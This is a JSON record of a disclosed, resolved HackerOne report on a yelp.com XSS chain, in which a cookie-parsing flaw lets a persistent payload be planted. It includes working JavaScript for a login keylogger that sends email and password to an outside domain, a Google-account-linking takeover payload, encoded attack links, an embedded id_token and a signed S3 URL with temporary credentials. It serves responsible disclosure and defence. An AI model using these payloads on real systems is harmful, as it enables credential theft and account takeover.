@@ -1,0 +1,134 @@
+{
+  "id": 2010530,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDEwNTMw",
+  "url": "https://hackerone.com/reports/2010530",
+  "title": "yelp.com XSS ATO (via login keylogger, link Google account)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-06-02T14:40:46.752Z",
+  "submitted_at": "2023-06-02T14:40:46.930Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lil_endian",
+    "url": "/lil_endian",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-08-15T11:59:03.777Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-08-15T11:59:03.666Z",
+  "team_member_agreed_on_going_public_at": "2023-08-10T20:17:01.582Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary:\nyelp.com reflects the content of the cookie `guvo` in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a `guvo` cookie inside a cookie named `yelpmainpaastacanary`. The `yelpmainpaastacanary` cookie can be set by including a URL query parameter `?canary=[Cookie value]`  in any request to `*.yelp.com`.\n\nThis report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on `https://biz.yelp.com/login` to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via \"Sign in with Google\".\n\n# Description\n## XSS via \"guvo\" cookie\nThe value of the cookie `guvo` is reflected (unescaped) on some pages. Most interestingly on the frontpage of `www.yelp.com` and on the login page of `https://biz.yelp.com/login`. The unescaped reflection happens in the `window.ySitRepParams` object and the `window.yelp.guv` property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:\n██████████\n█████████\n\n## Setting the \"yelpmainpaastacanary\" cookie\nThere is a feature on `yelp.com` where by adding the query parameter `?canary=asdf` to a request, the response will contain an HTTP header:\n```\nSet-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax\n```\nThis gives us a way to set the cookie `yelpmainpaastacanary` to any value we want. But we need a way to control the `guvo` cookie. It turns out that we can smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie.\n\n## Broken cookie parsing and cookie smuggeling\nThe Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like\n```\nCookie: a=1; b=2;\n```\nwhich should be parsed as 2 cookies `a` and `b`. But if we set a cookie like:\n```\nCookie: a=1 b=2;\n```\nThis should be parsed as 1 cookie `a` with the value \"`1 b=2`\", but Yelp will parse it as 2 cookies `a` and `b`. We can abuse this to smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie by making a request to \n```\nhttps://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E\n```\n████\n\nwhich sets the cookie\n```\nSet-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; \n```\nand results in our XSS payload triggering every time we visit the front page of `www.yelp.com`:\n{F2394020}\n\nAs an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:\n```\nhttps://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999\n```\n```\nSet-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax\n```\n\n# POCs\n_Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains._\n\n## Keylogger on biz.yelp.com/login\nThis javascript snippet will leak the content of the email and password fields on `https://biz.yelp.com/login` when the user types, or when the login form is submitted. The credentials are leaked to the domain `calc.sh` which I own:\n```javascript\nsetTimeout(function () {\n  a = document.getElementsByName('password')[0];\n  b = document.getElementsByName('email')[0];\n  function f() {\n    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);\n  }\n  a.form.onclick=f;\n  a.onchange=f;\n  b.onchange=f;\n  a.oninput=f;\n  b.oninput=f;\n}, 1000)\n```\n\nWe create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:\n```\nhttps://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ\n```\nOur final link looks like this:\n```\nhttps://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999\n```\n\nAnyone visiting that link will have our keylogger installed. Here's a short video showing it in action:\n███\n\n## Account takeover by linking a Google account\nThe request to link a Google account to a Yelp account is done from `https://yelp.com/profile_sharing`. The final request in the Google-link-flow is a POST request to `https://www.yelp.dk/google_connect/register` with CSRF token `csrftok` and a token `id_token` which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.\n\nTo generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:\n████████\n\nNow that we have a token for the Google accoutn `██████` we can create an XSS payload for a victim. In this code we make a request to `/profile_sharing` and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the `id_token` we prepared:\n```javascript\n(function f() {\n  a = new XMLHttpRequest();\n  a.addEventListener('load', function () {\n    rx = /\"GoogleConnect\": \"([^\"]*)/;\n    id_token = \"eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg\";\n    b = rx.exec(this.responseText);\n    fetch(\"https://www.yelp.dk/google_connect/register\", {\"method\": \"POST\", \"body\": new URLSearchParams({\"id_token\": id_token, \"csrftok\": b[1]})})\n  });\n  a.open('GET', 'https://www.yelp.dk/profile_sharing');\n  a.send();\n})();\n```\n\nAgain, we use this cyberchef recipe to create a link that infects the victim:\n```\nhttps://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw\n```\n\nAnd the final link looks like this:\n```\nhttps://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999\n```\n\nThis video shows the attack. On the left is the victim and on the right is the attacker. The victim is logged into their yelp account. He then signs out and at some point visits our malicious link. When the victim sometime later signs into his Yelp account our payload triggers and our Google account `████` is linked to the victim. The attacker can now sign in with Google and gets signed into the victims account.\n██████████\n\n## Impact\n\nThis attack can be used to completely compromise business accounts, and do account takeovers on normal accounts on yelp.com. Since the cookie does not expire, all it takes is for the victim to at some point vist our link, and they'll be compromised when they later go to sign in to yelp.com. The link can be spread via the Yelp forum, reviews or private messages to other uses, making it easy to target other Yelp users.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2394020,
+      "file_name": "2023-06-01-160522_987x540_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/acerr40blgw9kcshes890yrzw405?response-content-disposition=attachment%3B%20filename%3D%222023-06-01-160522_987x540_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-06-01-160522_987x540_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150634Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e7cf25fe1dd460eb420d78dfd93596d417a6acbb360f2a1f9a53cb97ce4d8c55",
+      "file_size": 26590,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-09-09T20:17:01.689Z",
+  "allow_singular_disclosure_after": -84048573.06234095,
+  "singular_disclosure_allowed": true,
+  "vote_count": 321,
+  "voters": [
+    "shelled",
+    "selmelc",
+    "kanazawaaaa",
+    "xchessy",
+    "cyberset",
+    "mokusou",
+    "orange303",
+    "aboalezz",
+    "aziz0x48",
+    "lil_endian",
+    "and 311 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 43913,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.yelp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
